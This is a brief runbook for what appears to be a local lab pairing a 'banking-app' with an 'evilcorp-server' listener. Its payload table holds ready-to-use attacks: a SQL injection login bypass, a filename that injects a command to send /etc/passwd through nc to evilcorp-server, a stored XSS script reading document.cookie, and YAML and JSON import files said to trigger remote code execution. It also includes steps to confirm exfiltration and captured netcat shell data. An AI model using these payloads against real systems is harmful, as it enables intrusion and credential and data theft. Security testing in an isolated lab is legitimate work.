# Active Testing Runbook (Local)

This document provides a quick-reference for the test scenarios defined in your knowledge folder.

## Targeted Payloads
| Scenario | Endpoint | Payload Snippet |
| :--- | :--- | :--- |
| SQLi Login | /login | Email: ' OR 1=1 -- |
| Command Injection | /export | Filename: ; cat /etc/passwd | nc evilcorp-server 5555 |
| YAML RCE | /import | Use import.yaml from knowledge folder |
| JSON Eval | /import | Use import.json from knowledge folder |
| Stored XSS | /submit_feedback | <script>alert(document.cookie)</script> |

## Post-Exploit Verification
After running a scenario, verify the results using these checks:

1. Verify Command Execution: docker exec banking-app ls /tmp/ (Look for yaml_attack_success.txt).
2. Verify Exfiltration: docker exec evilcorp-server cat /app/stolen_data/http_access.log.
3. Verify Netcat Shell: On evilcorp-server, check for files named netcat_*.txt containing captured data streams.

## Knowledge Folder Integration
The scripts import.yaml, import.json, and import.config.py are specifically designed to trigger the listeners on evilcorp-server. Ensure these files are uploaded through the /import UI for maximum impact.